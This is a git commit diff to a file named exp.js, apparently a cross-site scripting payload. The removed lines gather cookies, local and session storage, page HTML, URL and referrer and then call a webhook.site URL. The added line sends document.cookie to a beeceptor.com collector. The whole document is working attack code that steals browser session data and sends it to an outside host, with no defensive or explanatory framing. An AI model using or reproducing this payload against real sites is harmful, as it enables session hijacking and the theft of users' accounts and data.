9829ca2cee738591694859c15655ec85bf18c2dd
44r0nMeta <90402025+44r0nMeta@users.noreply.github.com>
2025-05-04 04:53:33 +0000

    Update exp.js

--- exp.js
+++ exp.js
@@ -1,12 +1,1 @@
-
-const data = {
-    cookies: document.cookie,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
-    dom: document.documentElement.innerHTML,
-    userAgent: navigator.userAgent,
-    url: window.location.href,
-    referrer: document.referrer,
-  };
-  
-  fetch('https://webhook.site/bf17564a-dae7-4a76-9ff8-239b0ff3cdc5');
+fetch("https://metaa.free.beeceptor.com?=" + document.cookie);
